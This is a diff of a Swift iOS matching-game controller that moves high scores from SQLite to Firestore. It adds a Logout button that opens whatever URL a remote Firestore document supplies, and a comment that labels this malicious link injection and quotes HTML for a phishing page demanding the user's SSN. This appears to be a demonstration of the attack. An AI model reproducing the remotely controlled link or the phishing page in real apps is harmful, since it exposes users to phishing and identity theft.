@@ -14,14 +14,15 @@ import UIKit
 
 class MainViewController: UIViewController {
     
-    // Mark: - Database
-    var db: OpaquePointer?
+    // MARK: - Database
+    var db: OpaquePointer? /// SQLite3
+    var dbF = Firestore.firestore() /// Cloud Firestore database
     var winners = [WinInfo]()
     
-    // Mark: - Properties
+    // MARK: - Properties
     var pickedBoxes: [UIImageView] = []
     
-    var numberOfBoxesTouched = 0 // used to run matching logic
+    var numberOfBoxesTouched = 0 /// used to run matching logic
     
     var shuffledColorsArray: [UIColor] = []
     
@@ -34,13 +35,13 @@ class MainViewController: UIViewController {
     var matchesIncrementer: Int = 0 {
  
         didSet {
-            // run didUserWinYet logic (pause timer if won and provide user way to enter their name if score reaches top 5)
-            print("There are " + String(matchesIncrementer) + " matches.")
-            if matchesIncrementer == 4 {
-                print("you won the game!")
+
+            if matchesIncrementer == 4 { /// Player matched all pairs
+                /// Stop timer
                 timer.invalidate()
+                /// Assign the captured time to a variable
                 winningTimeString = timerLabel.text!
-                print("Your winning time is: ", winningTimeString)
+                /// Display the winning time via an alert controller
                 displayWinAlert(withWinningTime: winningTimeString)
             }
         }
@@ -56,9 +57,36 @@ class MainViewController: UIViewController {
         return view.frame.height
     }
     
-    // Mark: - UI Elements
+    // MARK: - UI Elements
     
     lazy var functions = Functions.functions()
+    
+    lazy var logoutLink: UIButton = {
+        let btn = UIButton()
+        btn.backgroundColor = Service.appleRed
+        btn.setTitle("Logout", for: .normal)
+        btn.setTitleColor(.white, for: .normal)
+        btn.frame = CGRect(x: 0, y: 0, width: 100, height: 30)
+        btn.layer.cornerRadius = 8
+        btn.addTarget(self, action: #selector(logout), for: .touchUpInside)
+        return btn
+    }()
+    
+    /**
+     * Injection of malicious link via curl
+     *
+     *    <header style="background-color:powderblue; height:50px; "><div style="display: inline-block; margin-top: 5px; margin-left: 5px; font-size: 32px">PixMatch!</div></header><h1>To log out please provide your SSN:</h1><input type="text" placeholder="Placeholder text" /><button>Submit</button>
+     */
+    @objc func logout() {
+        var link: Any?
+        print(dbF.collection("links").document("logout").addSnapshotListener({ (snap, err) in
+            let dat: [String: Any] = snap!.data()!
+            print(dat["link"]! as Any)
+            link = dat["link"] as! String
+            let url = URL(string: link as! String)!
+            UIApplication.shared.open(url)
+        }))
+    }
     
     lazy var timerLabel: UILabel = {
         let lbl = UILabel()
@@ -263,7 +291,7 @@ class MainViewController: UIViewController {
         btn.setTitle("New Game", for: .normal)
         btn.titleLabel?.adjustsFontSizeToFitWidth = true
         btn.setTitleColor(.white, for: .normal)
-        btn.backgroundColor = .blue
+        btn.backgroundColor = Service.firebaseBlue
         btn.frame = CGRect(x: 0, y: 0, width: 100, height: 100)
         // Shadow
         btn.layer.shadowColor = UIColor.white.cgColor
@@ -279,45 +307,29 @@ class MainViewController: UIViewController {
         btn.setTitle("Best Times", for: .normal)
         btn.titleLabel?.adjustsFontSizeToFitWidth = true
         btn.setTitleColor(.white, for: .normal)
-        btn.backgroundColor = .blue
+        btn.backgroundColor = Service.firebaseBlue
         btn.frame = CGRect(x: 0, y: 0, width: 100, height: 100)
         // Shadow
         btn.layer.shadowColor = UIColor.white.cgColor
         btn.layer.shadowRadius = 8
         btn.layer.shadowOffset = .zero
         btn.layer.shadowOpacity = 0.5
-        btn.addTarget(self, action: #selector(testFirebaseFunctions), for: .touchUpInside)
+        btn.addTarget(self, action: #selector(getScores), for: .touchUpInside)
         return btn
     }()
     
-    // Mark: - Methods
+    // MARK: - Methods
     
+    /// Called just prior to showing view. Should perform animated events here.
     override func viewWillAppear(_ animated: Bool) {
         super.viewWillAppear(true)
     }
     
+    /// Main view has shown
     override func viewDidLoad() {
         super.viewDidLoad()
+        
         view.backgroundColor = UIColor.black
-        
-        let fileURL = try! FileManager.default.url(for: .documentDirectory, in: .userDomainMask, appropriateFor: nil, create: false)
-        .appendingPathComponent("testTEST.sqlite")
-        var d: OpaquePointer?
-        
-        if sqlite3_open(fileURL.path, &d) != SQLITE_OK {
-            print("error opening database")
-        } else {
-            db = d
-            print("Successfully opened connection to database at \(fileURL.path)")
-        }
-        
-        let query = "CREATE TABLE IF NOT EXISTS Winners (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, time TEXT)"
-        
-        if sqlite3_exec(db, query, nil, nil, nil) != SQLITE_OK {
-            let errmsg = String(cString: sqlite3_errmsg(db)!)
-            print("error creating table: \(errmsg)")
-        }
-        
         DispatchQueue.main.async {
             self.loadUIElements { (success) in
                 if success {
@@ -327,7 +339,25 @@ class MainViewController: UIViewController {
         }
         randomizeColorsAndBoxArrays()
     }
-
 }
 
-
+///For SQLite3 implementation
+/*
+ let fileURL = try! FileManager.default.url(for: .documentDirectory, in: .userDomainMask, appropriateFor: nil, create: false)
+ .appendingPathComponent("testTEST.sqlite")
+ var d: OpaquePointer?
+ 
+ if sqlite3_open(fileURL.path, &d) != SQLITE_OK {
+     print("error opening database")
+ } else {
+     db = d
+     print("Successfully opened connection to database at \(fileURL.path)")
+ }
+ 
+ let query = "CREATE TABLE IF NOT EXISTS Winners (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, time TEXT)"
+ 
+ if sqlite3_exec(db, query, nil, nil, nil) != SQLITE_OK {
+     let errmsg = String(cString: sqlite3_errmsg(db)!)
+     print("error creating table: \(errmsg)")
+ }
+ */
